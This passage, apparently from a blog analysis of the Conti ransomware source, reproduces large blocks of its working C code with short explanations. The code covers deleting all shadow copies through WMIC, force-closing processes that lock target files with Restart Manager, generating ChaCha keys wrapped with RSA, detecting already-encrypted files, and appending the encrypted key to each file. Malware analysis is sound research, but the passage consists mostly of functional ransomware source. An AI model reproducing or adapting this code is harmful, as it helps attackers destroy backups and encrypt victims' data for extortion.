HRESULT hr = pEnumerator-&gt;Next(WBEM_INFINITE, <span class="number">1</span>,</span><br><span class="line">			&amp;pclsObj, &amp;uReturn);</span><br><span class="line"></span><br><span class="line">		morphcode(hr);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="number">0</span> == uReturn)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		VARIANT vtProp;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// Get the value of the Name property</span></span><br><span class="line">		hr = pclsObj-&gt;Get(OBFW(<span class="string">L&quot;ID&quot;</span>), <span class="number">0</span>, &amp;vtProp, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		morphcode(hr);</span><br><span class="line"></span><br><span class="line">		WCHAR CmdLine[<span class="number">1024</span>];</span><br><span class="line">		RtlSecureZeroMemory(CmdLine, <span class="keyword">sizeof</span>(CmdLine));</span><br><span class="line">		wsprintfW(CmdLine, OBFW(<span class="string">L&quot;cmd.exe /c C:\\Windows\\System32\\wbem\\WMIC.exe shadowcopy where \&quot;ID=&#x27;%s&#x27;\&quot; delete&quot;</span>), vtProp.bstrVal);</span><br><span class="line"></span><br><span class="line">		morphcode();</span><br><span class="line"></span><br><span class="line">		LPVOID Old;</span><br><span class="line">		pWow64DisableWow64FsRedirection(&amp;Old);</span><br><span class="line"></span><br><span class="line">		morphcode(Old);</span><br><span class="line"></span><br><span class="line">		CmdExecW(CmdLine);</span><br><span class="line">		pWow64RevertWow64FsRedirection(Old);</span><br><span class="line"></span><br><span class="line">		morphcode(Old);</span><br><span class="line"></span><br><span class="line">		pVariantClear(&amp;vtProp);</span><br><span class="line">		pclsObj-&gt;Release();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h5 id="Cleanup"><a href="#Cleanup" class="headerlink" title="Cleanup"></a>Cleanup</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pContext) &#123;</span><br><span class="line">		pContext-&gt;Release();</span><br><span class="line">	&#125;</span><br><span class="line">	pSvc-&gt;Release();</span><br><span class="line">	pLoc-&gt;Release();</span><br><span class="line">	pEnumerator-&gt;Release();</span><br><span class="line">	pCoUninitialize();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CmdExecW"><a href="#CmdExecW" class="headerlink" title="CmdExecW"></a>CmdExecW</h4><p>first set the STARTUPINFOW’s property——<strong>wShowWindow</strong>, then CreateProcess using the arg Cmdline passed in.</p>
<h4 id="CheckForDataBases"><a href="#CheckForDataBases" class="headerlink" title="CheckForDataBases"></a>CheckForDataBases</h4><p>generate a long list of Extensions that are database.And check the file extension if in the Database Extension List.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">INT Count = <span class="keyword">sizeof</span>(Extensions) / <span class="keyword">sizeof</span>(LPWSTR);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; Count; i++) &#123;</span><br><span class="line"></span><br><span class="line">	morphcode((LPVOID)Filename);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pStrStrIW(Filename, Extensions[i])) &#123;</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CheckForVirtualMachines"><a href="#CheckForVirtualMachines" class="headerlink" title="CheckForVirtualMachines"></a>CheckForVirtualMachines</h4><p>Extension</p>
<blockquote>
<p>OBFW(L”.vdi”),OBFW(L”.vhd”),OBFW(L”.vmdk”),OBFW(L”.pvm”),OBFW(L”.vmem”),OBFW(L”.vmsn”),OBFW(L”.vmsd”),OBFW(L”.nvram”),OBFW(L”.vmx”),OBFW(L”.raw”),OBFW(L”.qcow2”),OBFW(L”.subvol”),OBFW(L”.bin”),OBFW(L”.vsv”),OBFW(L”.avhd”),OBFW(L”.vmrs”),OBFW(L”.vhdx”),OBFW(L”.avdx”),OBFW(L”.vmcx”),OBFW(L”.iso”)</p>
</blockquote>
<p>then check the file extension if in the Virtual Machine Extension List.</p>
<h4 id="WriteFullData"><a href="#WriteFullData" class="headerlink" title="WriteFullData"></a>WriteFullData</h4><p>a normal write function</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">WriteFullData</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in HANDLE hFile,</span></span><br><span class="line"><span class="params">	__in LPVOID Buffer,</span></span><br><span class="line"><span class="params">	__in DWORD Size</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD TotalWritten = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesWritten = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToWrite = Size;</span><br><span class="line">	DWORD Offset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TotalWritten != Size)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		morphcode(TotalWritten);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pWriteFile(hFile, (LPBYTE)Buffer + Offset, BytesToWrite, &amp;BytesWritten, <span class="literal">NULL</span>) || !BytesWritten) &#123;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesWritten);</span><br><span class="line"></span><br><span class="line">		Offset += BytesWritten;</span><br><span class="line"></span><br><span class="line">		morphcode(Offset);</span><br><span class="line"></span><br><span class="line">		TotalWritten += BytesWritten;</span><br><span class="line"></span><br><span class="line">		morphcode(BytesToWrite);</span><br><span class="line"></span><br><span class="line">		BytesToWrite -= BytesWritten;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="KillFileOwner"><a href="#KillFileOwner" class="headerlink" title="KillFileOwner"></a>KillFileOwner</h4><p><strong>getapi::IsRestartManagerLoaded()</strong></p>
<p>Restart Manager session，so how can we judge a session is loaded.</p>
<p>We can find the code that modify the value in the anti-hook.cpp, if the Rstrtmgr.dll is loaded, this means the Manager session is loaded.</p>
<p><img src="https://scr1pt-1302658871.cos.ap-chengdu.myqcloud.com/img/image-20220428190326952.png" alt="image-20220428190326952"></p>
<h5 id="pRmStartSession"><a href="#pRmStartSession" class="headerlink" title="pRmStartSession"></a><strong>pRmStartSession</strong></h5><p>Starts a new Restart Manager session. A maximum of 64 Restart Manager sessions per user session can be open on the system at the same time. When this function starts a session, it returns a session handle and session key that can be used in subsequent calls to the Restart Manager API.</p>
<h5 id="pRmRegisterResources"><a href="#pRmRegisterResources" class="headerlink" title="pRmRegisterResources"></a><strong>pRmRegisterResources</strong></h5><p>Registers resources to a Restart Manager session. The Restart Manager uses the list of resources registered with the session to determine which applications and services must be shut down and restarted。Resources can be identified by filenames, service short names, or <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/restartmanager/ns-restartmanager-rm_unique_process">RM_UNIQUE_PROCESS</a> structures that describe running applications. The <strong>RmRegisterResources</strong> function can be used by a primary or secondary installer.</p>
<h5 id="pRmGetList"><a href="#pRmGetList" class="headerlink" title="pRmGetList"></a><strong>pRmGetList</strong></h5><p>Gets a list of all applications and services that are currently using resources that have been registered with the Restart Manager session.</p>
<h5 id="pRmShutdown"><a href="#pRmShutdown" class="headerlink" title="pRmShutdown"></a><strong>pRmShutdown</strong></h5><p>Initiates the shutdown of applications. This function can only be called from the installer that started the Restart Manager session using the <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/restartmanager/nf-restartmanager-rmstartsession">RmStartSession</a> function.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">KillFileOwner</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in LPCWSTR PathName)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!getapi::IsRestartManagerLoaded()) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Restart manager not loaded.&quot;</span>));</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	BOOL Result = FALSE;</span><br><span class="line">	DWORD dwSession = <span class="number">0x0</span>;</span><br><span class="line">	DWORD ret = <span class="number">0</span>;</span><br><span class="line">	WCHAR szSessionKey[CCH_RM_SESSION_KEY + <span class="number">1</span>];</span><br><span class="line">	RtlSecureZeroMemory(szSessionKey, <span class="keyword">sizeof</span>(szSessionKey));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (pRmStartSession(&amp;dwSession, <span class="number">0x0</span>, szSessionKey) == ERROR_SUCCESS)</span><br><span class="line">	&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (pRmRegisterResources(dwSession, <span class="number">1</span>, &amp;PathName,</span><br><span class="line">			<span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>) == ERROR_SUCCESS)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			DWORD dwReason = <span class="number">0x0</span>;</span><br><span class="line">			UINT nProcInfoNeeded = <span class="number">0</span>;</span><br><span class="line">			UINT nProcInfo = <span class="number">0</span>;</span><br><span class="line">			PRM_PROCESS_INFO ProcessInfo = <span class="literal">NULL</span>;</span><br><span class="line">			RtlSecureZeroMemory(&amp;ProcessInfo, <span class="keyword">sizeof</span>(ProcessInfo));</span><br><span class="line"></span><br><span class="line">			ret = (DWORD)pRmGetList(dwSession, &amp;nProcInfoNeeded,</span><br><span class="line">				&amp;nProcInfo, <span class="literal">NULL</span>, &amp;dwReason);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (ret != ERROR_MORE_DATA || !nProcInfoNeeded) &#123;</span><br><span class="line"></span><br><span class="line">				pRmEndSession(dwSession);</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ProcessInfo = (PRM_PROCESS_INFO)memory::Alloc(<span class="keyword">sizeof</span>(RM_PROCESS_INFO) * nProcInfoNeeded);</span><br><span class="line">			<span class="keyword">if</span> (!ProcessInfo) &#123;</span><br><span class="line"></span><br><span class="line">				pRmEndSession(dwSession);</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			nProcInfo = nProcInfoNeeded;</span><br><span class="line">			ret = (DWORD)pRmGetList(dwSession, &amp;nProcInfoNeeded,</span><br><span class="line">				&amp;nProcInfo, ProcessInfo, &amp;dwReason);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (ret != ERROR_SUCCESS || !nProcInfoNeeded) &#123;</span><br><span class="line"></span><br><span class="line">				memory::Free(ProcessInfo);</span><br><span class="line">				pRmEndSession(dwSession);</span><br><span class="line">				<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			DWORD ProcessId = (DWORD)pGetProcessId(pGetCurrentProcess());</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (INT i = <span class="number">0</span>; i &lt; nProcInfo; i++) &#123;</span><br><span class="line"></span><br><span class="line">				<span class="keyword">if</span> (ProcessInfo[i].Process.dwProcessId == ProcessId) &#123;</span><br><span class="line"></span><br><span class="line">					memory::Free(ProcessInfo);</span><br><span class="line">					pRmEndSession(dwSession);</span><br><span class="line">					<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				process_killer::PPID Pid = <span class="literal">NULL</span>;</span><br><span class="line">				TAILQ_FOREACH(Pid, g_WhitelistPids, Entries) &#123;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> (ProcessInfo[i].Process.dwProcessId == Pid-&gt;dwProcessId) &#123;</span><br><span class="line"></span><br><span class="line">						memory::Free(ProcessInfo);</span><br><span class="line">						pRmEndSession(dwSession);</span><br><span class="line">						<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			Result = pRmShutdown(dwSession, RmForceShutdown, <span class="literal">NULL</span>) == ERROR_SUCCESS;</span><br><span class="line">			memory::Free(ProcessInfo);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		pRmEndSession(dwSession);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="GenKey"><a href="#GenKey" class="headerlink" title="GenKey"></a>GenKey</h4><p>encrypt the public key. The first 32 bytes is the chacha encryption’s key, and the next 4 byte is the IV.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">GenKey</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in HCRYPTPROV Provider,</span></span><br><span class="line"><span class="params">	__in HCRYPTKEY PublicKey,</span></span><br><span class="line"><span class="params">	__in cryptor::LPFILE_INFO FileInfo</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwDataLen = <span class="number">40</span>;</span><br><span class="line"></span><br><span class="line">	morphcode(FileInfo);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pCryptGenRandom(Provider, <span class="number">32</span>, FileInfo-&gt;ChachaKey)) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	morphcode(FileInfo-&gt;ChachaKey);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pCryptGenRandom(Provider, <span class="number">8</span>, FileInfo-&gt;ChachaIV)) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	morphcode(FileInfo-&gt;ChachaIV);</span><br><span class="line"></span><br><span class="line">	RtlSecureZeroMemory(&amp;FileInfo-&gt;CryptCtx, <span class="keyword">sizeof</span>(FileInfo-&gt;CryptCtx));</span><br><span class="line">	ECRYPT_keysetup(&amp;FileInfo-&gt;CryptCtx, FileInfo-&gt;ChachaKey, <span class="number">256</span>, <span class="number">64</span>);</span><br><span class="line">	ECRYPT_ivsetup(&amp;FileInfo-&gt;CryptCtx, FileInfo-&gt;ChachaIV);</span><br><span class="line"></span><br><span class="line">	memory::Copy(FileInfo-&gt;EncryptedKey, FileInfo-&gt;ChachaKey, <span class="number">32</span>);</span><br><span class="line">	memory::Copy(FileInfo-&gt;EncryptedKey + <span class="number">32</span>, FileInfo-&gt;ChachaIV, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	morphcode(FileInfo-&gt;EncryptedKey);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pCryptEncrypt(PublicKey, <span class="number">0</span>, TRUE, <span class="number">0</span>, FileInfo-&gt;EncryptedKey, &amp;dwDataLen, <span class="number">524</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CheckContiPatter"><a href="#CheckContiPatter" class="headerlink" title="CheckContiPatter"></a>CheckContiPatter</h4><blockquote>
<p>g_ContiPattern is a global arg that has a certain value.Read 16 bytes of the file,And check with below.</p>
<p>STATIC CONST BYTE g_ContiPattern[16] &#x3D; { 0xab, 0xff, 0x63, 0xa1, 0x6f, 0xa2 , 0x6e, 0x6e, 0xa3, 0x74, 0x69, 0xbf, 0x4c, 0xdd, 0xff, 0xa1 };</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">CheckContiPattern</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in cryptor::LPFILE_INFO FileInfo, </span></span><br><span class="line"><span class="params">	__out PBOOL Error</span></span><br><span class="line"><span class="params">	)</span></span><br><span class="line">&#123;</span><br><span class="line">	LARGE_INTEGER Pointer;</span><br><span class="line">	Pointer.QuadPart = <span class="number">-16</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Pointer, <span class="literal">NULL</span>, FILE_END)) &#123;</span><br><span class="line"></span><br><span class="line">		*Error = TRUE;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	DWORD TotalRead = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesRead = <span class="number">0</span>;</span><br><span class="line">	DWORD Offset = <span class="number">0</span>;</span><br><span class="line">	DWORD BytesToRead = <span class="number">16</span>;</span><br><span class="line">	BYTE Buffer[<span class="number">16</span>];</span><br><span class="line">	RtlSecureZeroMemory(Buffer, <span class="keyword">sizeof</span>(Buffer));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (TotalRead != <span class="number">16</span>) &#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!pReadFile(FileInfo-&gt;FileHandle, Buffer + Offset, BytesToRead, &amp;BytesRead, <span class="literal">NULL</span>) || !BytesRead) &#123;</span><br><span class="line">			</span><br><span class="line">			*Error = TRUE;</span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		TotalRead += BytesRead;</span><br><span class="line">		Offset += BytesRead;</span><br><span class="line">		BytesToRead -= BytesRead;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	*Error = FALSE;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">memcmp</span>(g_ContiPattern, Buffer, <span class="number">16</span>)) &#123;</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="WriteEncryptInfo"><a href="#WriteEncryptInfo" class="headerlink" title="WriteEncryptInfo"></a>WriteEncryptInfo</h4><p>write the Encryption note to the txt.</p>
<blockquote>
<p>mainly use the pSetFilePointerEx to make it.</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">STATIC</span><br><span class="line">BOOL</span><br><span class="line"><span class="title function_">WriteEncryptInfo</span><span class="params">(</span></span><br><span class="line"><span class="params">	__in cryptor::LPFILE_INFO FileInfo,</span></span><br><span class="line"><span class="params">	__in BYTE EncryptMode,</span></span><br><span class="line"><span class="params">	__in BYTE DataPercent</span></span><br><span class="line"><span class="params">)</span></span><br><span class="line">&#123;</span><br><span class="line">	BOOL Success;</span><br><span class="line">	LARGE_INTEGER Offset;</span><br><span class="line">	BYTE Buffer[<span class="number">10</span>];</span><br><span class="line">	Buffer[<span class="number">0</span>] = EncryptMode;</span><br><span class="line">	Buffer[<span class="number">1</span>] = DataPercent;</span><br><span class="line">	memory::Copy(Buffer + <span class="number">2</span>, &amp;FileInfo-&gt;FileSize, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">	Offset.QuadPart = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, <span class="literal">NULL</span>, FILE_END)) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t write key for file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Success = WriteFullData(FileInfo-&gt;FileHandle, FileInfo-&gt;EncryptedKey, <span class="number">524</span>);</span><br><span class="line">	<span class="keyword">if</span> (!Success) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t write key for file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	Success = WriteFullData(FileInfo-&gt;FileHandle, Buffer, <span class="number">10</span>);</span><br><span class="line">	<span class="keyword">if</span> (!Success) &#123;</span><br><span class="line"></span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t write key for file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	pSetEndOfFile(FileInfo-&gt;FileHandle);</span><br><span class="line">	Success = (BOOL)pSetFilePointerEx(FileInfo-&gt;FileHandle, Offset, <span class="literal">NULL</span>, FILE_BEGIN);</span><br><span class="line">	<span class="keyword">if</span> (!Success) &#123;</span><br><span class="line">		logs::Write(OBFW(<span class="string">L&quot;Can&#x27;t write key for file %s. GetLastError = %lu&quot;</span>), FileInfo-&gt;Filename, pGetLastError());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> Success;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="OpenFileEncrypt"><a href="#OpenFileEncrypt" class="headerlink" title="OpenFileEncrypt"></a>OpenFileEncrypt</h4><p>pGetFileAttributesW</p>
<p>pSetFileAttributesW</p>
<p>FileInfo-&gt;FileHandle &#x3D; pCreateFileW(FileInfo-&gt;Filename,GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,0,NULL);</p>
<p>KillFileOwner</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 